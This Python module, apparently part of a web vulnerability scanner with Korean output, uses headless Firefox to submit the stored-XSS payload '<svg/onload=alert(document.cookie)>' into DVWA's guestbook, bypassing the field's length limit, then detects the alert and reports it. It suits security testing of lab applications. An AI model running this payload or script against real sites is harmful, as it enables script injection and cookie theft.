import requests
from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    TimeoutException, NoAlertPresentException, UnexpectedAlertPresentException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import shutil
import traceback
from rich.console import Console
from rich.table import Table
from rich.align import Align

console = Console()

def run(soup, headers, find_path_dic, security_level):
    xss_payloads = [
        '<svg/onload=alert(document.cookie)>',
    ]

    input_name_field = "txtName"
    message_field = "mtxMessage"
    submit_button_name = "btnSign"
    default_message = "2344234"
    max_length = "100"

    def clear_guestbook(dr):
        csrf = dr.execute_script(
            "return document.querySelector('input[name=\"csrf\"]')?.value || '';"
        )
        dr.execute_script("""
            const f=document.createElement('form');
            f.method='POST';f.action='';
            f.innerHTML='<input name=btnClear value=Clear>'
                       +'<input name=csrf value="'+arguments[0]+'">';
            document.body.appendChild(f);f.submit();
        """, csrf)

    final_result = []
    printed_table_title = False

    for dic in find_path_dic:
        base_url = dic["url"]
        if "/vulnerabilities/xss_s/" not in base_url:
            continue

        opt = FirefoxOptions()
        opt.add_argument("--headless")
        opt.set_capability("unhandledPromptBehavior", "accept")

        gecko_path = shutil.which("geckodriver") or "/snap/bin/geckodriver"
        service = FirefoxService(executable_path=gecko_path)
        driver = webdriver.Firefox(service=service, options=opt)
        driver.set_page_load_timeout(10)

        driver.get(base_url)
        driver.delete_all_cookies()
        for ck in headers.get("Cookie", "").split(";"):
            if "=" in ck:
                k, v = ck.strip().split("=", 1)
                driver.add_cookie({"name": k, "value": v})
        driver.get(base_url)

        console.print("[*] Firefox-headless Stored-XSS 스캔 시작\n", style="cyan")

        for payload in xss_payloads:
            try:
                driver.get(base_url)
                driver.execute_script(
                    f"document.querySelector('input[name=\"{input_name_field}\"]')"
                    f".setAttribute('maxlength','{max_length}');"
                )

                WebDriverWait(driver, 6).until(
                    EC.presence_of_element_located((By.NAME, input_name_field)))
                driver.find_element(By.NAME, input_name_field).clear()
                driver.find_element(By.NAME, input_name_field).send_keys(payload)

                driver.find_element(By.NAME, message_field).clear()
                driver.find_element(By.NAME, message_field).send_keys(default_message)

                try:
                    driver.find_element(By.NAME, submit_button_name).click()
                except UnexpectedAlertPresentException as e:
                    alert_text = e.alert_text
                    if not printed_table_title:
                        console.print(Align.center("[italic bold green]Stored XSS 탐지 결과[/]"))
                        printed_table_title = True

                    table = Table(show_lines=True)
                    table.add_column("항목", style="white", justify="center")
                    table.add_column("내용", style="white", justify="center")
                    table.add_row("URL", base_url)
                    table.add_row("VULN NAME", "Stored XSS")
                    table.add_row("Payload", payload)
                    table.add_row("Alert", alert_text)
                    console.print(Align.center(table))
                    final_result.append({"URL": base_url, "Payload": payload, "Alert": alert_text})
                    clear_guestbook(driver)
                    continue

                try:
                    WebDriverWait(driver, 10).until(EC.alert_is_present())
                    a = driver.switch_to.alert
                    alert_text = a.text
                    a.accept()

                    if not printed_table_title:
                        console.print(Align.center("[italic bold green]Stored XSS 탐지 결과[/]"))
                        printed_table_title = True

                    table = Table(show_lines=True)
                    table.add_column("항목", style="white", justify="center")
                    table.add_column("내용", style="white", justify="center")
                    table.add_row("URL", base_url)
                    table.add_row("VULN NAME", "Stored XSS")
                    table.add_row("Payload", payload)
                    table.add_row("Alert", alert_text)
                    console.print(Align.center(table))

                    final_result.append({"URL": base_url, "Payload": payload, "Alert": alert_text})
                except (TimeoutException, NoAlertPresentException):
                    pass

                clear_guestbook(driver)

            except Exception:
                traceback.print_exc()
                continue

        driver.quit()

    if not final_result:
        console.print("[!] Stored XSS 취약점이 없습니다.", style="bold red")
        return "[!] Stored XSS 취약점이 없습니다."

    console.print(f"[✓] Stored XSS 총 {len(final_result)}건 탐지 완료.", style="bold green")
    return final_result
